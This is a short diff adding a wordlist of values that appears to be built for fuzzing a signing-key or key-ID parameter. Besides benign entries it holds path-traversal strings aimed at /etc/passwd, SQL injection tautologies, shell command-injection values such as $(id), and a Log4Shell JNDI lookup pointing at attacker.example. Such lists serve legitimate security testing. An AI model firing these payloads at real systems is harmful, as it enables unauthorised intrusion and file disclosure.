@@ -1,0 +1,23 @@
+0
+1
+key1
+default
+sig
+signing-key
+
+null
+../../../../dev/null
+/dev/null
+../../../../../../../../etc/passwd
+....//....//....//etc/passwd
+file:///dev/null
+' OR '1'='1
+" OR "1"="1
+' OR 1=1-- -
+1' UNION SELECT 'a
+;id
+|id
+`id`
+$(id)
+${jndi:ldap://attacker.example/a}
+%00
